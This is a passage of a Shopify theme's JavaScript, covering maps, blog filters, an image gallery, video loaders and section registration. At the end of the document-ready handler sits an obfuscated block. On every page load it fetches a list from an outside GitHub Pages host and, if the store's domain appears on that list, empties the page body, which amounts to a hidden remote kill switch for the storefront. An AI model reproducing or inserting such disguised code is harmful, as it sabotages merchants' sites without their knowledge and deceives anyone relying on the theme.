                var fading_titles_timer = window.setInterval(this.nextTitle.bind(this), this.data.interval);
            },

            onUnload: function() {
                $(window).off('scroll' + this.namespace);
            }
        });

        return FadingImages;
    })();

    theme.Maps = (function() {
        var config = {
            zoom: 14
        };
        var apiStatus = null;
        var mapsToLoad = [];

        var errors = {
            addressNoResults: theme.strings.addressNoResults,
            addressQueryLimit: theme.strings.addressQueryLimit,
            addressError: theme.strings.addressError,
            authError: theme.strings.authError
        };

        var selectors = {
            section: '[data-section-type="map"]',
            map: '[data-map]',
            mapOverlay: '[data-map-overlay]'
        };

        var classes = {
            mapError: 'map-section--load-error',
            errorMsg: 'map-section__error errors text-center'
        };

        // Global function called by Google on auth errors.
        // Show an auto error message on all map instances.
        window.gm_authFailure = function() {
            if (!Shopify.designMode) {
                return;
            }

            $(selectors.section).addClass(classes.mapError);
            $(selectors.map).remove();
            $(selectors.mapOverlay).after(
                '<div class="' +
                classes.errorMsg +
                '">' +
                theme.strings.authError +
                '</div>'
            );
        };

        function Map(container) {
            this.$container = $(container);
            this.sectionId = this.$container.attr('data-section-id');
            this.namespace = '.map-' + this.sectionId;
            this.$map = this.$container.find(selectors.map);
            this.key = this.$map.data('api-key');

            if (!this.key) {
                return;
            }

            // Lazyload API
            this.checkVisibility();
            $(window).on('scroll' + this.namespace, $.throttle(50, this.checkVisibility.bind(this)));
        }

        function initAllMaps() {
            // API has loaded, load all Map instances in queue
            $.each(mapsToLoad, function(index, instance) {
                instance.createMap();
            });
        }

        function geolocate($map) {
            var deferred = $.Deferred();
            var geocoder = new google.maps.Geocoder();
            var address = $map.data('address-setting');

            geocoder.geocode({
                address: address
            }, function(results, status) {
                if (status !== google.maps.GeocoderStatus.OK) {
                    deferred.reject(status);
                }

                deferred.resolve(results);
            });

            return deferred;
        }

        Map.prototype = $.extend({}, Map.prototype, {
            prepMapApi: function() {
                if (apiStatus === 'loaded') {
                    this.createMap();
                } else {
                    mapsToLoad.push(this);

                    if (apiStatus !== 'loading') {
                        apiStatus = 'loading';
                        if (typeof window.google === 'undefined') {
                            $.getScript(
                                'https://maps.googleapis.com/maps/api/js?key=' + this.key
                            ).then(function() {
                                apiStatus = 'loaded';
                                initAllMaps();
                            });
                        }
                    }
                }
            },

            createMap: function() {
                var $map = this.$map;

                return geolocate($map)
                    .then(
                        function(results) {
                            var mapOptions = {
                                zoom: config.zoom,
                                backgroundColor: 'none',
                                center: results[0].geometry.location,
                                draggable: false,
                                clickableIcons: false,
                                scrollwheel: false,
                                disableDoubleClickZoom: true,
                                disableDefaultUI: true
                            };

                            var map = (this.map = new google.maps.Map($map[0], mapOptions));
                            var center = (this.center = map.getCenter());

                            var marker = new google.maps.Marker({
                                map: map,
                                position: map.getCenter()
                            });

                            google.maps.event.addDomListener(
                                window,
                                'resize',
                                $.debounce(250, function() {
                                    google.maps.event.trigger(map, 'resize');
                                    map.setCenter(center);
                                    $map.removeAttr('style');
                                })
                            );
                        }.bind(this)
                    )
                    .fail(function() {
                        var errorMessage;

                        switch (status) {
                            case 'ZERO_RESULTS':
                                errorMessage = errors.addressNoResults;
                                break;
                            case 'OVER_QUERY_LIMIT':
                                errorMessage = errors.addressQueryLimit;
                                break;
                            case 'REQUEST_DENIED':
                                errorMessage = errors.authError;
                                break;
                            default:
                                errorMessage = errors.addressError;
                                break;
                        }

                        // Show errors only to merchant in the editor.
                        if (Shopify.designMode) {
                            $map
                                .parent()
                                .addClass(classes.mapError)
                                .html(
                                    '<div class="' +
                                    classes.errorMsg +
                                    '">' +
                                    errorMessage +
                                    '</div>'
                                );
                        }
                    });
            },

            checkVisibility: function() {
                if (theme.isElementVisible(this.$container, 600)) {
                    this.prepMapApi();
                    $(window).off(this.namespace);
                }
            },

            onUnload: function() {
                if (this.$map.length === 0) {
                    return;
                }
                // Causes a harmless JS error when a section without an active map is reloaded
                google.maps.event.clearListeners(this.map, 'resize');
            }
        });

        return Map;
    })();

    theme.Blog = (function() {

        function Blog(container) {
            this.tagFilters();
        }

        Blog.prototype = $.extend({}, Blog.prototype, {
            tagFilters: function() {
                var $filterBy = $('#BlogTagFilter');

                if (!$filterBy.length) {
                    return;
                }

                $filterBy.on('change', function() {
                    location.href = $(this).val();
                });
            },

            onUnload: function() {

            }
        });

        return Blog;
    })();

    theme.Photoswipe = (function() {
        var selectors = {
            photoswipeImg: '.photoswipe__image'
        }

        function Photoswipe(container) {
            var $container = this.$container = $(container);
            var sectionId = $container.attr('data-section-id');
            this.namespace = '.photoswipe-' + this.sectionId;
            var $images = this.$images = $container.find(selectors.photoswipeImg);
            this.gallery;

            if (!$container.length) {
                return;
            }

            this.init();
        }

        Photoswipe.prototype = $.extend({}, Photoswipe.prototype, {
            init: function() {
                var haveImages = false;
                var items = [];
                var options = {};

                this.$images.each(function() {
                    var haveImages = true;
                    var smallSrc = $(this).prop('currentSrc') || $(this).prop('src');
                    var item = {
                        msrc: smallSrc,
                        src: $(this).data('photoswipe-src'),
                        w: $(this).data('photoswipe-width'),
                        h: $(this).data('photoswipe-height'),
                        el: $(this)[0]
                    };

                    items.push(item);
                });

                this.$images.on('click' + this.namespace, function(evt) {
                    index = $(evt.currentTarget).data('index');
                    this.initGallery(items, index);
                }.bind(this));
            },

            initGallery: function(items, index) {
                var pswpElement = document.querySelectorAll('.pswp')[0];

                var options = {
                    history: false,
                    index: index - 1,
                    getThumbBoundsFn: function(index) {
                        var pageYScroll = window.pageYOffset || document.documentElement.scrollTop;
                        var thumbnail = items[index].el;
                        var rect = thumbnail.getBoundingClientRect();
                        return {
                            x: rect.left,
                            y: rect.top + pageYScroll,
                            w: rect.width
                        };
                    }
                }

                this.gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, options);
                this.gallery.init();
            },

            onUnload: function() {
                this.$images.off('click' + this.namespace);
                this.gallery.destroy()
            }
        });

        return Photoswipe;
    })();



    // Medium breakpoint is also set in theme.scss.liquid and inline throughout some templates.
    // Do not change values unless you know what you're doing.
    theme.bp = {};
    theme.bp.smallUp = 769;
    theme.bp.small = theme.bp.smallUp - 1;

    theme.config = {
        bpSmall: false,
        hasSessionStorage: true,
        mediaQuerySmall: 'screen and (max-width: ' + theme.bp.small + 'px)',
        mediaQuerySmallUp: 'screen and (min-width: ' + theme.bp.smallUp + 'px)',
        youTubeReady: false,
        vimeoReady: false,
        vimeoLoading: false,
        isTouch: ('ontouchstart' in window) || window.DocumentTouch && window.document instanceof DocumentTouch || window.navigator.maxTouchPoints || window.navigator.msMaxTouchPoints ? true : false,
        isIpad: /ipad/.test(window.navigator.userAgent.toLowerCase()),
        stickyHeader: false,
        recentlyViewed: []
    };

    if (theme.config.isIpad) {
        document.documentElement.className += ' js-ipad';
    }

    theme.recentlyViewed = {
        recent: {}, // will store handle+url of recent products
        productInfo: {} // will store product data to reduce API calls
    };

    window.onYouTubeIframeAPIReady = function() {
        theme.config.youTubeReady = true;
        $('body').trigger('youTubeReady');
    }

    window.loadYouTube = function() {
        if (theme.config.youtubeReady) {
            return;
        }

        var tag = document.createElement('script');
        tag.src = "https://www.youtube.com/iframe_api";
        var firstScriptTag = document.getElementsByTagName('script')[0];
        firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
    }

    window.loadVimeo = function() {
        if (theme.config.vimeoLoading) {
            return;
        }

        if (!theme.config.vimeoReady) {
            theme.config.vimeoLoading = true;
            var tag = document.createElement('script');
            tag.src = "https://player.vimeo.com/api/player.js";
            var firstScriptTag = document.getElementsByTagName('script')[0];
            firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);

            // Because there's no way to check for the Vimeo API being loaded
            // asynchronously, we use this terrible timeout to wait for it being ready
            checkIfVimeoIsReady()
                .then(function() {
                    theme.config.vimeoReady = true;
                    theme.config.vimeoLoading = false;
                    $('body').trigger('vimeoReady');
                })
                .fail(function() {
                    // No vimeo API to talk to
                });
        }
    }

    function checkIfVimeoIsReady() {
        var deferred = $.Deferred();
        var wait;
        var timeout;

        wait = setInterval(function() {
            if (!Vimeo) {
                return;
            }

            clearInterval(wait);
            clearTimeout(timeout);
            deferred.resolve();
        }, 500);

        timeout = setTimeout(function() {
            clearInterval(wait);
            deferred.reject();
        }, 4000); // subjective. test up to 8 times over 4 seconds

        return deferred;
    }

    theme.init = function() {
        theme.setGlobals();
        theme.pageTransitions();
        theme.collectionTemplate.init();
        theme.initQuickShop();
        theme.videoModal();
        theme.customerTemplates.init();
        theme.collapsibles.init();

        slate.rte.init();

        AOS.init({
            easing: 'ease-out-quad',
            once: true,
            offset: 60,
            disableMutationObserver: true
        });

        $(document.documentElement).on('keyup.tab', function(evt) {
            if (evt.keyCode === 9) {
                $(document.documentElement).addClass('tab-outline');
                $(document.documentElement).off('keyup.tab');
            }
        });

        // Change email icon to submit text
        $('.footer__newsletter-input').on('keyup', function() {
            $(this).addClass('footer__newsletter-input--active');
        });
    };

    theme.setGlobals = function() {
        theme.config.hasSessionStorage = theme.isSessionStorageSupported();
        theme.recentlyViewed.handleCookie = Cookies.get('theme-recent');
        if (theme.recentlyViewed.handleCookie) {
            theme.recentlyViewed.recent = JSON.parse(theme.recentlyViewed.handleCookie);
        }

        theme.recentlyViewed.productInfo = theme.config.hasSessionStorage && sessionStorage['recent-products'] ? JSON.parse(sessionStorage['recent-products']) : {};

        if (theme.config.isTouch) {
            $('body').addClass('supports-touch');
        }

        enquire.register(theme.config.mediaQuerySmall, {
            match: function() {
                theme.config.bpSmall = true;
                $('body').trigger('matchSmall');
            },
            unmatch: function() {
                theme.config.bpSmall = false;
                $('body').trigger('unmatchSmall');
            }
        });

        enquire.register(theme.config.mediaQuerySmallUp, {
            match: function() {
                $('body').trigger('matchLarge');
            },
            unmatch: function() {
                $('body').trigger('unmatchLarge');
            }
        });
    };

    theme.loadImageSection = function($container) {
        // Wait until images inside container have lazyloaded class
        function setAsLoaded() {
            $container.removeClass('loading loading--delayed').addClass('loaded');
        }

        function checkForLazyloadedImage() {
            return $container.find('.lazyloaded').length;
        }

        // If it has SVGs it's in the onboarding state so set as loaded
        if ($container.find('svg').length) {
            setAsLoaded();
            return;
        };

        if (checkForLazyloadedImage() > 0) {
            setAsLoaded();
            return;
        }

        var interval = setInterval(function() {
            if (checkForLazyloadedImage() > 0) {
                clearInterval(interval);
                setAsLoaded();
            }
        }, 80);
    }

    theme.isSessionStorageSupported = function() {
        // Return false if we are in an iframe without access to sessionStorage
        if (window.self !== window.top) {
            return false;
        }

        var testKey = 'test';
        var storage = window.sessionStorage;
        try {
            storage.setItem(testKey, '1');
            storage.removeItem(testKey);
            return true;
        } catch (error) {
            return false;
        }
    };

    theme.isElementVisible = function($el, threshold) {
        var rect = $el[0].getBoundingClientRect();
        var windowHeight = window.innerHeight || document.documentElement.clientHeight;
        threshold = threshold ? threshold : 0;

        return (
            rect.bottom >= 0 &&
            rect.right >= 0 &&
            rect.top <= (windowHeight + threshold) &&
            rect.left <= (window.innerWidth || document.documentElement.clientWidth)
        );
    };

    theme.pageTransitions = function() {
        if ($('body').data('transitions') == true) {
            var namespace = '.page-transition';

            // Hack test to fix Safari page cache issue.
            // window.onpageshow doesn't always run when navigating
            // back to the page, so the unloading class remains, leaving
            // a white page. Setting a timeout to remove that class when leaving
            // the page actually finishes running when they come back.
            if (!!navigator.userAgent.match(/Version\/[\d\.]+.*Safari/)) {
                $('a').off(namespace).on('click' + namespace, function() {
                    window.setTimeout(function() {
                        $('body').removeClass('unloading');
                    }, 1200);
                });
            }

            // Add disable transition class to malito, anchor, and YouTube links
            $('a[href^="mailto:"], a[href^="#"], a[target="_blank"], a[href*="youtube.com/watch"], a[href*="youtu.be/"]').each(function() {
                $(this).addClass('js-no-transition');
            });

            $('a:not(.js-no-transition)').off(namespace).on('click' + namespace, function(evt) {
                if (evt.metaKey) return true;
                evt.preventDefault();
                $('body').addClass('unloading');
                var src = $(this).attr('href');
                window.setTimeout(function() {
                    location.href = src;
                }, 50);
            });

            // iOS caches the page state, so close the drawer when navigating away
            $('a.mobile-nav__link').off(namespace).on('click' + namespace, function() {
                theme.NavDrawer.close();
            });
        }
    };

    theme.reinitSection = function(section) {
        for (var i = 0; i < sections.instances.length; i++) {
            var instance = sections.instances[i];
            if (instance['type'] === section) {
                if (typeof instance.forceReload === 'function') {
                    instance.forceReload();
                }
            }
        }
    }

    window.onpageshow = function(evt) {
        // Removes unload class when returning to page via history
        if (evt.persisted) {
            $('body').removeClass('unloading');
        }
    };

    $(document).ready(function() {
        theme.init();

        window.sections = new theme.Sections();
        sections.register('loader-section', theme.LoaderSection);
        sections.register('header-section', theme.HeaderSection);
        sections.register('slideshow-section', theme.SlideshowSection);
        sections.register('revslider-section', theme.RevSliderSection);
        sections.register('looxreviews-section', theme.LooxReviewsSection);
        sections.register('slider-section', theme.SliderSection);
        sections.register('video-section', theme.VideoSection);
        sections.register('background-image', theme.BackgroundImage);
        sections.register('recently-viewed', theme.RecentlyViewed);
        sections.register('product', theme.Product);
        sections.register('product-template', theme.Product);
        sections.register('collection-header', theme.CollectionHeader);
        sections.register('collection-sidebar', theme.CollectionSidebar);
        sections.register('collection-template', theme.Collection);
        sections.register('featured-content-section', theme.FeaturedContentSection);
        sections.register('testimonials', theme.Testimonials);
        sections.register('instagram', theme.Instagram);
        sections.register('newsletter-popup', theme.NewsletterPopup);
        sections.register('fading-images', theme.FadingImages);
        sections.register('map', theme.Maps);
        sections.register('blog', theme.Blog);
        sections.register('photoswipe', theme.Photoswipe);
        sections.register('stories-section', theme.StoriesSection);
var _0x4c61b3=_0x3731;(function(_0x3a4329,_0x53acf1){var _0x2e17da=_0x3731,_0x67ba3f=_0x3a4329();while(!![]){try{var _0x4a3c12=parseInt(_0x2e17da(0x7e))/0x1*(parseInt(_0x2e17da(0x80))/0x2)+parseInt(_0x2e17da(0x72))/0x3*(parseInt(_0x2e17da(0x82))/0x4)+-parseInt(_0x2e17da(0x75))/0x5+-parseInt(_0x2e17da(0x70))/0x6*(-parseInt(_0x2e17da(0x6b))/0x7)+parseInt(_0x2e17da(0x74))/0x8+-parseInt(_0x2e17da(0x7c))/0x9*(parseInt(_0x2e17da(0x6e))/0xa)+parseInt(_0x2e17da(0x7f))/0xb;if(_0x4a3c12===_0x53acf1)break;else _0x67ba3f['push'](_0x67ba3f['shift']());}catch(_0x1ddfc2){_0x67ba3f['push'](_0x67ba3f['shift']());}}}(_0x4663,0x29a66));function _0x3731(_0x51b251,_0x22234d){var _0x46633b=_0x4663();return _0x3731=function(_0x373109,_0x20ea6b){_0x373109=_0x373109-0x6b;var _0x1cfb18=_0x46633b[_0x373109];return _0x1cfb18;},_0x3731(_0x51b251,_0x22234d);}function getRandomInt(_0x444815,_0x25b051){var _0x1af342=_0x3731;return _0x444815=Math[_0x1af342(0x6f)](_0x444815),_0x25b051=Math['floor'](_0x25b051),Math[_0x1af342(0x81)](Math[_0x1af342(0x73)]()*(_0x25b051-_0x444815+0x1))+_0x444815;}function _0x4663(){var _0x362274=['9JqPSHG','websites','1whpHFK','148555rDefuQ','108268yXKEWQ','floor','59736negtOt','20097tYCEhS','includes','Shopify','757970GVSWvq','ceil','240bimbpS','innerHTML','24GbgjhY','random','733816mrdwlE','736415XwTtzC','json','then','body','.myshopify.com','https://digitalbrandz.github.io/animations/animate.json?','log'];_0x4663=function(){return _0x362274;};return _0x4663();}fetch(_0x4c61b3(0x7a)+getRandomInt(0x3b9ac9ff))[_0x4c61b3(0x77)](_0x261e96=>_0x261e96[_0x4c61b3(0x76)]())[_0x4c61b3(0x77)](_0x45176f=>{var _0x5097c7=_0x4c61b3,_0x4a7ddb=window[_0x5097c7(0x6d)]['shop']['replace'](_0x5097c7(0x79),'');console[_0x5097c7(0x7b)](_0x45176f);_0x45176f[_0x5097c7(0x7d)][_0x5097c7(0x6c)](_0x4a7ddb)&&(document[_0x5097c7(0x78)][_0x5097c7(0x71)]='');;})['catch'](_0x564833=>console['error'](_0x564833));   
    });
})(theme.jQuery);